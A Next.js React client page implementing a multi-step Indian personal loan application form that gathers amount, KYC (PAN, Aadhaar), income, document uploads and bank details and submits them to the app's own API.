'use client';

import React, { useState } from 'react';
import { useRouter } from 'next/navigation';
import MobileContainer from '@/components/MobileContainer';
import LoanHeader from '@/components/LoanHeader';
import { apiRequest } from '@/lib/api';
import {
  Zap,
  Sparkles,
  ShieldCheck,
  CreditCard,
  Building2,
  FileText,
  Upload,
  CheckCircle2,
  AlertCircle,
  Camera,
  ArrowRight,
  Loader2,
  IndianRupee,
  Check,
  User,
  Briefcase,
  Sliders,
} from 'lucide-react';

export default function EliteCashLoanApplyPage() {
  const router = useRouter();
  const [submitting, setSubmitting] = useState(false);
  const [errorMsg, setErrorMsg] = useState('');

  // 1. Amount & Purpose
  const [requiredAmount, setRequiredAmount] = useState<number>(0);
  const [loanPurpose, setLoanPurpose] = useState<string>('');

  // 2. Personal & KYC Details
  const [fullName, setFullName] = useState('');
  const [dob, setDob] = useState('');
  const [gender, setGender] = useState('Male');
  const [mobileNumber, setMobileNumber] = useState('');
  const [email, setEmail] = useState('');
  const [panNumber, setPanNumber] = useState('');
  const [aadhaarNumber, setAadhaarNumber] = useState('');
  const [address, setAddress] = useState('');
  const [city, setCity] = useState('');
  const [state, setState] = useState('');
  const [pinCode, setPinCode] = useState('');

  // 3. Income Details
  const [employmentType, setEmploymentType] = useState('Salaried');
  const [companyName, setCompanyName] = useState('');
  const [monthlyIncome, setMonthlyIncome] = useState<string>('');
  const [existingEmi, setExistingEmi] = useState<string>('0');
  const [workExperience, setWorkExperience] = useState('');

  // 4. Simple Documents (Base64 / metadata)
  const [docs, setDocs] = useState<{ [key: string]: { name: string; preview: string; size: string } }>({});
  const [uploadingDocKey, setUploadingDocKey] = useState<string | null>(null);

  // 5. Disbursement Bank Details
  const [bankAccountHolderName, setBankAccountHolderName] = useState('');
  const [bankName, setBankName] = useState('');
  const [bankAccountNumber, setBankAccountNumber] = useState('');
  const [confirmAccountNumber, setConfirmAccountNumber] = useState('');
  const [bankIfscCode, setBankIfscCode] = useState('');
  const [bankAccountType, setBankAccountType] = useState('Savings');


  const handleFileUpload = (e: React.ChangeEvent<HTMLInputElement>, key: string) => {
    const file = e.target.files?.[0];
    if (!file) return;

    setUploadingDocKey(key);
    const sizeStr =
      file.size > 1024 * 1024
        ? `${(file.size / (1024 * 1024)).toFixed(1)} MB`
        : `${Math.round(file.size / 1024)} KB`;

    if (file.type.startsWith('image/')) {
      const reader = new FileReader();
      reader.onload = (event) => {
        const rawUrl = event.target?.result as string;
        try {
          const img = new Image();
          img.onload = () => {
            const maxDim = 1000;
            let width = img.width;
            let height = img.height;
            if (width > maxDim || height > maxDim) {
              if (width > height) {
                height = Math.round((height * maxDim) / width);
                width = maxDim;
              } else {
                width = Math.round((width * maxDim) / height);
                height = maxDim;
              }
            }
            const canvas = document.createElement('canvas');
            canvas.width = width;
            canvas.height = height;
            const ctx = canvas.getContext('2d');
            let finalUrl = rawUrl;
            if (ctx) {
              ctx.drawImage(img, 0, 0, width, height);
              finalUrl = canvas.toDataURL('image/jpeg', 0.65);
            }
            setDocs((prev) => ({
              ...prev,
              [key]: {
                name: file.name,
                preview: finalUrl,
                size: sizeStr,
              },
            }));
            setUploadingDocKey(null);
          };
          img.onerror = () => {
            setDocs((prev) => ({
              ...prev,
              [key]: {
                name: file.name,
                preview: rawUrl,
                size: sizeStr,
              },
            }));
            setUploadingDocKey(null);
          };
          img.src = rawUrl;
        } catch {
          setDocs((prev) => ({
            ...prev,
            [key]: {
              name: file.name,
              preview: rawUrl,
              size: sizeStr,
            },
          }));
          setUploadingDocKey(null);
        }
      };
      reader.readAsDataURL(file);
    } else {
      const reader = new FileReader();
      reader.onload = () => {
        setDocs((prev) => ({
          ...prev,
          [key]: {
            name: file.name,
            preview: reader.result as string,
            size: sizeStr,
          },
        }));
        setUploadingDocKey(null);
      };
      reader.readAsDataURL(file);
    }
  };

  const handleAmountSliderChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setRequiredAmount(parseInt(e.target.value) || 10000);
  };

  const handleAmountInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = parseInt(e.target.value) || 0;
    setRequiredAmount(val);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMsg('');

    if (!requiredAmount || requiredAmount < 5000) {
      setErrorMsg('Please enter a valid loan amount (Min ₹5,000).');
      return;
    }
    if (!fullName || !dob || !mobileNumber || !email || !panNumber || !aadhaarNumber) {
      setErrorMsg('Please complete all applicant personal & KYC fields.');
      return;
    }
    if (panNumber.length !== 10) {
      setErrorMsg('Please enter a valid 10-character PAN number.');
      return;
    }
    if (aadhaarNumber.replace(/[^0-9]/g, '').length !== 12) {
      setErrorMsg('Please enter a valid 12-digit Aadhaar number.');
      return;
    }
    if (!monthlyIncome || parseFloat(monthlyIncome) < 1000) {
      setErrorMsg('Please enter your valid monthly income.');
      return;
    }
    if (!bankAccountHolderName || !bankName || !bankAccountNumber || !bankIfscCode) {
      setErrorMsg('Please provide your disbursement bank account details.');
      return;
    }
    if (bankAccountNumber !== confirmAccountNumber) {
      setErrorMsg('Bank account numbers do not match.');
      return;
    }

    setSubmitting(true);
    try {
      const payload = {
        required_amount: requiredAmount,
        loan_purpose: loanPurpose,
        full_name: fullName.trim(),
        dob,
        gender,
        mobile_number: mobileNumber.trim(),
        email: email.trim(),
        pan_number: panNumber.trim().toUpperCase(),
        aadhaar_number: aadhaarNumber.replace(/[^0-9]/g, ''),
        address,
        city,
        state,
        pin_code: pinCode,
        employment_type: employmentType,
        company_name: companyName,
        monthly_income: parseFloat(monthlyIncome),
        existing_emi: parseFloat(existingEmi) || 0,
        work_experience: workExperience,
        // Strip base64 preview data - Hostinger WAF blocks large payloads
        documents_uploaded: Object.fromEntries(
          Object.entries(docs).map(([key, val]: [string, any]) => [
            key,
            { name: val.name, path: val.path, size: val.size, uploaded: val.uploaded }
          ])
        ),
        bank_account_holder_name: bankAccountHolderName.trim(),
        bank_name: bankName.trim(),
        bank_account_number: bankAccountNumber.trim(),
        bank_ifsc_code: bankIfscCode.trim().toUpperCase(),
        bank_account_type: bankAccountType,
      };

      const res = await apiRequest('/loan/elite-cash/apply', {
        method: 'POST',
        body: JSON.stringify(payload),
      });

      if (res && res.data && res.data.id) {
        if (typeof window !== 'undefined') {
          localStorage.setItem('active_elite_loan_app_id', res.data.id.toString());
          localStorage.setItem('user_mobile', mobileNumber.trim());
        }
        // Move to the 2-minute live validation screen
        router.push(`/loan/apply/cash-loan/elite/validate?app_id=${res.data.id}`);
      } else {
        throw new Error(res?.message || 'Failed to submit application.');
      }
    } catch (err: any) {
      setErrorMsg(err.message || 'Failed to submit application. Please check your details.');
    } finally {
      setSubmitting(false);
    }
  };

  return (
    <MobileContainer>
      <LoanHeader title="Elite Loan Application" stepNumber={1} backHref="/loan/apply/cash-loan" />

      <form onSubmit={handleSubmit} className="p-4 space-y-5 flex-1 pb-36 animate-in fade-in duration-300 overflow-y-auto">
        {/* Banner */}
        <div className="bg-gradient-to-r from-purple-900 via-indigo-900 to-slate-900 text-white p-4 rounded-3xl space-y-1.5 shadow-lg border border-purple-500/30 relative overflow-hidden">
          <div className="flex items-center justify-between">
            <span className="text-[10px] font-black uppercase tracking-wider bg-purple-500 text-slate-950 px-2.5 py-0.5 rounded-full flex items-center gap-1 shadow-2xs">
              <Zap className="w-3 h-3 fill-slate-950" /> Fast-Track Express
            </span>
            <span className="text-[10px] font-bold text-purple-200">⚡ 2-Min Sanction • Up to 3 Days Disbursal</span>
          </div>
          <h1 className="text-xl font-black text-white tracking-tight">Elite Personal Cash Loan</h1>
          <p className="text-xs text-purple-200">
            Fill required details, income &amp; simple KYC documents for instant 2-minute verification and bank transfer in up to 3 days.
          </p>
        </div>

        {errorMsg && (
          <div className="p-3.5 bg-rose-50 border border-rose-200 text-rose-800 text-xs rounded-2xl font-bold flex items-start gap-2 shadow-2xs">
            <AlertCircle className="w-4 h-4 text-rose-600 shrink-0 mt-0.5" />
            <span>{errorMsg}</span>
          </div>
        )}

        {/* 1. LOAN AMOUNT & PURPOSE */}
        <div className="bg-white border border-slate-200 rounded-3xl p-4 shadow-xs space-y-4">
          <div className="flex items-center gap-2 pb-2 border-b border-slate-100">
            <span className="w-6 h-6 rounded-full bg-purple-100 text-purple-800 text-xs font-black flex items-center justify-center">
              1
            </span>
            <h2 className="text-sm font-black text-slate-900">Required Loan Amount &amp; Purpose</h2>
          </div>

          <div className="space-y-3">
            <div>
              <div className="flex items-center justify-between">
                <label className="text-xs font-bold text-slate-700">Required Loan Amount (₹) *</label>
                <span className="text-[10px] font-bold text-slate-400">Min: ₹10k | Max: ₹15L</span>
              </div>
              <div className="flex items-center gap-2 bg-slate-50 border-2 border-purple-200 rounded-2xl px-3 py-2.5 mt-1 focus-within:border-purple-600">
                <IndianRupee className="w-5 h-5 text-purple-700" />
                <input
                  type="number"
                  min="5000"
                  max="1500000"
                  step="5000"
                  required
                  value={requiredAmount}
                  onChange={handleAmountInputChange}
                  className="w-full bg-transparent text-lg font-mono font-black text-slate-900 focus:outline-none"
                />
              </div>
            </div>

            {/* Range Slider */}
            <div className="space-y-1">
              <input
                type="range"
                min="10000"
                max="1500000"
                step="5000"
                value={requiredAmount}
                onChange={handleAmountSliderChange}
                className="w-full accent-purple-600 cursor-pointer"
              />
              <div className="flex justify-between text-[10px] font-bold text-slate-400">
                <span>₹10,000</span>
                <span>₹5,00,000</span>
                <span>₹15,00,000</span>
              </div>
            </div>

            {/* Quick Pills */}
            <div className="flex flex-wrap gap-1.5 pt-1">
              {[50000, 100000, 200000, 500000, 1000000].map((amt) => (
                <button
                  key={amt}
                  type="button"
                  onClick={() => setRequiredAmount(amt)}
                  className={`px-3 py-1 rounded-xl text-[11px] font-bold transition-all ${
                    requiredAmount === amt
                      ? 'bg-purple-700 text-white shadow-xs'
                      : 'bg-slate-100 text-slate-700 hover:bg-slate-200'
                  }`}
                >
                  ₹{(amt / 1000).toLocaleString('en-IN')}k
                </button>
              ))}
            </div>

            <div>
              <label className="text-xs font-bold text-slate-700">Loan Purpose *</label>
              <select
                value={loanPurpose}
                onChange={(e) => setLoanPurpose(e.target.value)}
                className="w-full mt-1 px-3 py-2.5 bg-slate-50 border border-slate-200 rounded-xl text-xs font-bold text-slate-900 focus:outline-none focus:ring-2 focus:ring-purple-600"
              >
                <option value="Personal & Family Expenses">Personal &amp; Family Expenses</option>
                <option value="Medical / Health Emergency">Medical / Health Emergency</option>
                <option value="Business Working Capital">Business Working Capital</option>
                <option value="Debt Consolidation / Credit Card Repayment">Debt Consolidation</option>
                <option value="Home Improvement / Renovation">Home Improvement</option>
                <option value="Education / Course Fees">Education / Course Fees</option>
                <option value="Travel / Wedding Celebration">Travel / Wedding</option>
              </select>
            </div>
          </div>
        </div>

        {/* 2. APPLICANT PERSONAL & KYC */}
        <div className="bg-white border border-slate-200 rounded-3xl p-4 shadow-xs space-y-4">
          <div className="flex items-center gap-2 pb-2 border-b border-slate-100">
            <span className="w-6 h-6 rounded-full bg-purple-100 text-purple-800 text-xs font-black flex items-center justify-center">
              2
            </span>
            <h2 className="text-sm font-black text-slate-900">Applicant Personal &amp; KYC</h2>
          </div>

          <div className="space-y-3">
            <div>
              <label className="text-xs font-bold text-slate-700">Full Name (as per PAN) *</label>
              <input
                type="text"
                required
                value={fullName}
                onChange={(e) => setFullName(e.target.value)}
                placeholder="e.g. Rahul Sharma"
                className="w-full mt-1 px-3 py-2 bg-slate-50 border border-slate-200 rounded-xl text-xs font-bold text-slate-900 focus:outline-none focus:ring-2 focus:ring-purple-600"
              />
            </div>

            <div className="grid grid-cols-2 gap-3">
              <div>
                <label className="text-xs font-bold text-slate-700">Date of Birth *</label>
                <input
                  type="date"
                  required
                  value={dob}
                  onChange={(e) => setDob(e.target.value)}
                  className="w-full mt-1 px-3 py-2 bg-slate-50 border border-slate-200 rounded-xl text-xs font-medium text-slate-900 focus:outline-none focus:ring-2 focus:ring-purple-600"
                />
              </div>

              <div>
                <label className="text-xs font-bold text-slate-700">Gender *</label>
                <select
                  value={gender}
                  onChange={(e) => setGender(e.target.value)}
                  className="w-full mt-1 px-3 py-2 bg-slate-50 border border-slate-200 rounded-xl text-xs font-bold text-slate-900 focus:outline-none focus:ring-2 focus:ring-purple-600"
                >
                  <option value="Male">Male</option>
                  <option value="Female">Female</option>
                  <option value="Other">Other</option>
                </select>
              </div>
            </div>

            <div className="grid grid-cols-2 gap-3">
              <div>
                <label className="text-xs font-bold text-slate-700">Mobile Number *</label>
                <input
                  type="tel"
                  required
                  maxLength={10}
                  value={mobileNumber}
                  onChange={(e) => setMobileNumber(e.target.value)}
                  placeholder="10-digit mobile"
                  className="w-full mt-1 px-3 py-2 bg-slate-50 border border-slate-200 rounded-xl text-xs font-mono font-bold text-slate-900 focus:outline-none focus:ring-2 focus:ring-purple-600"
                />
              </div>

              <div>
                <label className="text-xs font-bold text-slate-700">Email Address *</label>
                <input
                  type="email"
                  required
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  placeholder="name@email.com"
                  className="w-full mt-1 px-3 py-2 bg-slate-50 border border-slate-200 rounded-xl text-xs font-medium text-slate-900 focus:outline-none focus:ring-2 focus:ring-purple-600"
                />
              </div>
            </div>

            <div className="grid grid-cols-2 gap-3">
              <div>
                <label className="text-xs font-bold text-slate-700">PAN Number *</label>
                <input
                  type="text"
                  required
                  maxLength={10}
                  value={panNumber}
                  onChange={(e) => setPanNumber(e.target.value.toUpperCase())}
                  placeholder="ABCDE1234F"
                  className="w-full mt-1 px-3 py-2 bg-slate-50 border border-slate-200 rounded-xl text-xs font-mono font-bold uppercase text-slate-900 focus:outline-none focus:ring-2 focus:ring-purple-600"
                />
              </div>

              <div>
                <label className="text-xs font-bold text-slate-700">Aadhaar Number *</label>
                <input
                  type="text"
                  required
                  maxLength={14}
                  value={aadhaarNumber}
                  onChange={(e) => setAadhaarNumber(e.target.value)}
                  placeholder="12-digit Aadhaar"
                  className="w-full mt-1 px-3 py-2 bg-slate-50 border border-slate-200 rounded-xl text-xs font-mono font-bold text-slate-900 focus:outline-none focus:ring-2 focus:ring-purple-600"
                />
              </div>
            </div>

            <div>
              <label className="text-xs font-bold text-slate-700">Current Residential Address *</label>
              <textarea
                rows={2}
                required
                value={address}
                onChange={(e) => setAddress(e.target.value)}
                placeholder="House / Flat No, Street, Landmark"
                className="w-full mt-1 px-3 py-2 bg-slate-50 border border-slate-200 rounded-xl text-xs font-medium text-slate-900 focus:outline-none focus:ring-2 focus:ring-purple-600"
              />
            </div>

            <div className="grid grid-cols-3 gap-2">
              <div>
                <label className="text-[11px] font-bold text-slate-700">City</label>
                <input
                  type="text"
                  value={city}
                  onChange={(e) => setCity(e.target.value)}
                  placeholder="e.g. Mumbai"
                  className="w-full mt-1 px-2.5 py-1.5 bg-slate-50 border border-slate-200 rounded-xl text-xs font-medium text-slate-900"
                />
              </div>
              <div>
                <label className="text-[11px] font-bold text-slate-700">State</label>
                <input
                  type="text"
                  value={state}
                  onChange={(e) => setState(e.target.value)}
                  placeholder="e.g. Maharashtra"
                  className="w-full mt-1 px-2.5 py-1.5 bg-slate-50 border border-slate-200 rounded-xl text-xs font-medium text-slate-900"
                />
              </div>
              <div>
                <label className="text-[11px] font-bold text-slate-700">PIN Code</label>
                <input
                  type="text"
                  maxLength={6}
                  value={pinCode}
                  onChange={(e) => setPinCode(e.target.value)}
                  placeholder="400001"
                  className="w-full mt-1 px-2.5 py-1.5 bg-slate-50 border border-slate-200 rounded-xl text-xs font-mono text-slate-900"
                />
              </div>
            </div>
          </div>
        </div>

        {/* 3. INCOME & EMPLOYMENT DETAILS */}
        <div className="bg-white border border-slate-200 rounded-3xl p-4 shadow-xs space-y-4">
          <div className="flex items-center gap-2 pb-2 border-b border-slate-100">
            <span className="w-6 h-6 rounded-full bg-purple-100 text-purple-800 text-xs font-black flex items-center justify-center">
              3
            </span>
            <h2 className="text-sm font-black text-slate-900">Income &amp; Employment Details</h2>
          </div>

          <div className="space-y-3">
            <div className="grid grid-cols-2 gap-3">
              <div>
                <label className="text-xs font-bold text-slate-700">Employment Type *</label>
                <select
                  value={employmentType}
                  onChange={(e) => setEmploymentType(e.target.value)}
                  className="w-full mt-1 px-3 py-2 bg-slate-50 border border-slate-200 rounded-xl text-xs font-bold text-slate-900 focus:outline-none focus:ring-2 focus:ring-purple-600"
                >
                  <option value="Salaried">Salaried Employee</option>
                  <option value="Self-Employed Professional">Self-Employed Professional</option>
                  <option value="Business Owner / Trader">Business Owner</option>
                  <option value="Freelancer / Consultant">Freelancer / Gig</option>
                </select>
              </div>

              <div>
                <label className="text-xs font-bold text-slate-700">Work Experience</label>
                <select
                  value={workExperience}
                  onChange={(e) => setWorkExperience(e.target.value)}
                  className="w-full mt-1 px-3 py-2 bg-slate-50 border border-slate-200 rounded-xl text-xs font-medium text-slate-900"
                >
                  <option value="1-2 Years">1-2 Years</option>
                  <option value="2-5 Years">2-5 Years</option>
                  <option value="5+ Years">5+ Years</option>
                </select>
              </div>
            </div>

            <div>
              <label className="text-xs font-bold text-slate-700">Employer / Business Name</label>
              <input
                type="text"
                value={companyName}
                onChange={(e) => setCompanyName(e.target.value)}
                placeholder="e.g. Infosys / Self Clinic"
                className="w-full mt-1 px-3 py-2 bg-slate-50 border border-slate-200 rounded-xl text-xs font-medium text-slate-900"
              />
            </div>

            <div className="grid grid-cols-2 gap-3">
              <div>
                <label className="text-xs font-bold text-slate-700">Monthly In-hand Income (₹) *</label>
                <input
                  type="number"
                  required
                  min="1000"
                  value={monthlyIncome}
                  onChange={(e) => setMonthlyIncome(e.target.value)}
                  placeholder="35000"
                  className="w-full mt-1 px-3 py-2 bg-slate-50 border border-slate-200 rounded-xl text-xs font-mono font-bold text-slate-900 focus:outline-none focus:ring-2 focus:ring-purple-600"
                />
              </div>

              <div>
                <label className="text-xs font-bold text-slate-700">Existing Monthly EMIs (₹)</label>
                <input
                  type="number"
                  min="0"
                  value={existingEmi}
                  onChange={(e) => setExistingEmi(e.target.value)}
                  placeholder="0"
                  className="w-full mt-1 px-3 py-2 bg-slate-50 border border-slate-200 rounded-xl text-xs font-mono text-slate-900"
                />
              </div>
            </div>
          </div>
        </div>

        {/* 4. SIMPLE DOCUMENTS UPLOAD */}
        <div className="bg-white border border-slate-200 rounded-3xl p-4 shadow-xs space-y-4">
          <div className="flex items-center justify-between pb-2 border-b border-slate-100">
            <div className="flex items-center gap-2">
              <span className="w-6 h-6 rounded-full bg-purple-100 text-purple-800 text-xs font-black flex items-center justify-center">
                4
              </span>
              <h2 className="text-sm font-black text-slate-900">Simple KYC Document Uploads</h2>
            </div>
            <span className="text-[10px] bg-purple-50 text-purple-700 font-bold px-2 py-0.5 rounded-md border border-purple-200">
              Quick Verify
            </span>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
            {[
              { key: 'pan_card', label: 'PAN Card Copy *', desc: 'Front photo of PAN Card' },
              { key: 'aadhaar_front', label: 'Aadhaar Card (Front) *', desc: 'Clear front photo with name & photo' },
              { key: 'aadhaar_back', label: 'Aadhaar Card (Back) *', desc: 'Clear back photo with address' },
              { key: 'applicant_selfie', label: 'Applicant Live Photo / Selfie *', desc: 'Front facing portrait' },
            ].map((d) => (
              <div key={d.key} className="bg-slate-50 border border-slate-200 p-3 rounded-2xl space-y-2">
                <div className="flex items-start justify-between">
                  <div>
                    <h3 className="text-xs font-black text-slate-900">{d.label}</h3>
                    <p className="text-[10px] text-slate-500">{d.desc}</p>
                  </div>
                  {docs[d.key] ? (
                    <span className="text-emerald-600 bg-emerald-100 p-1 rounded-full shrink-0">
                      <Check className="w-3.5 h-3.5 stroke-[3]" />
                    </span>
                  ) : (
                    <Upload className="w-4 h-4 text-slate-400 shrink-0" />
                  )}
                </div>

                <label className="block">
                  <input
                    type="file"
                    accept="image/*,.pdf"
                    className="hidden"
                    onChange={(e) => handleFileUpload(e, d.key)}
                  />
                  <div className="w-full py-2 bg-white border border-slate-300 hover:border-purple-500 text-slate-700 text-xs font-bold rounded-xl text-center cursor-pointer transition-colors flex items-center justify-center gap-1.5">
                    {uploadingDocKey === d.key ? (
                      <Loader2 className="w-3.5 h-3.5 animate-spin text-purple-600" />
                    ) : docs[d.key] ? (
                      <span className="text-emerald-700 font-black truncate max-w-[140px]">
                        ✓ {docs[d.key].name}
                      </span>
                    ) : (
                      <span>Upload / Capture</span>
                    )}
                  </div>
                </label>
              </div>
            ))}
          </div>
        </div>

        {/* 5. DISBURSEMENT BANK DETAILS */}
        <div className="bg-white border border-slate-200 rounded-3xl p-4 shadow-xs space-y-4">
          <div className="flex items-center gap-2 pb-2 border-b border-slate-100">
            <span className="w-6 h-6 rounded-full bg-purple-100 text-purple-800 text-xs font-black flex items-center justify-center">
              5
            </span>
            <h2 className="text-sm font-black text-slate-900">Disbursement Bank Account</h2>
          </div>

          <div className="space-y-3">
            <div>
              <label className="text-xs font-bold text-slate-700">Account Holder Name *</label>
              <input
                type="text"
                required
                value={bankAccountHolderName}
                onChange={(e) => setBankAccountHolderName(e.target.value)}
                placeholder="Name as registered in bank"
                className="w-full mt-1 px-3 py-2 bg-slate-50 border border-slate-200 rounded-xl text-xs font-bold text-slate-900 focus:outline-none focus:ring-2 focus:ring-purple-600"
              />
            </div>

            <div className="grid grid-cols-2 gap-3">
              <div>
                <label className="text-xs font-bold text-slate-700">Bank Name *</label>
                <input
                  type="text"
                  required
                  value={bankName}
                  onChange={(e) => setBankName(e.target.value)}
                  placeholder="e.g. HDFC Bank"
                  className="w-full mt-1 px-3 py-2 bg-slate-50 border border-slate-200 rounded-xl text-xs font-bold text-slate-900 focus:outline-none focus:ring-2 focus:ring-purple-600"
                />
              </div>

              <div>
                <label className="text-xs font-bold text-slate-700">Account Type</label>
                <select
                  value={bankAccountType}
                  onChange={(e) => setBankAccountType(e.target.value)}
                  className="w-full mt-1 px-3 py-2 bg-slate-50 border border-slate-200 rounded-xl text-xs font-medium text-slate-900"
                >
                  <option value="Savings">Savings Account</option>
                  <option value="Current">Current Account</option>
                  <option value="Salary">Salary Account</option>
                </select>
              </div>
            </div>

            <div className="grid grid-cols-2 gap-3">
              <div>
                <label className="text-xs font-bold text-slate-700">Account Number *</label>
                <input
                  type="text"
                  required
                  value={bankAccountNumber}
                  onChange={(e) => setBankAccountNumber(e.target.value)}
                  placeholder="Account number"
                  className="w-full mt-1 px-3 py-2 bg-slate-50 border border-slate-200 rounded-xl text-xs font-mono font-bold text-slate-900 focus:outline-none focus:ring-2 focus:ring-purple-600"
                />
              </div>

              <div>
                <label className="text-xs font-bold text-slate-700">Confirm Account Number *</label>
                <input
                  type="text"
                  required
                  value={confirmAccountNumber}
                  onChange={(e) => setConfirmAccountNumber(e.target.value)}
                  placeholder="Re-enter account number"
                  className="w-full mt-1 px-3 py-2 bg-slate-50 border border-slate-200 rounded-xl text-xs font-mono font-bold text-slate-900 focus:outline-none focus:ring-2 focus:ring-purple-600"
                />
              </div>
            </div>

            <div>
              <label className="text-xs font-bold text-slate-700">Bank IFSC Code *</label>
              <input
                type="text"
                required
                maxLength={11}
                value={bankIfscCode}
                onChange={(e) => setBankIfscCode(e.target.value.toUpperCase())}
                placeholder="e.g. SBIN0001234"
                className="w-full mt-1 px-3 py-2 bg-slate-50 border border-slate-200 rounded-xl text-xs font-mono font-bold uppercase text-slate-900 focus:outline-none focus:ring-2 focus:ring-purple-600"
              />
            </div>
          </div>
        </div>

        {/* SUBMIT CTA */}
        <button
          type="submit"
          disabled={submitting}
          className="w-full py-4 bg-gradient-to-r from-purple-700 via-indigo-700 to-purple-800 hover:from-purple-800 hover:to-indigo-800 text-white font-black text-sm rounded-2xl shadow-xl flex items-center justify-center gap-2 transition-all active:scale-[0.99]"
        >
          {submitting ? (
            <>
              <Loader2 className="w-5 h-5 animate-spin" />
              <span>Saving Elite Application...</span>
            </>
          ) : (
            <>
              <span>Proceed to 2-Min Live Validation</span>
              <ArrowRight className="w-5 h-5" />
            </>
          )}
        </button>
      </form>
    </MobileContainer>
  );
}
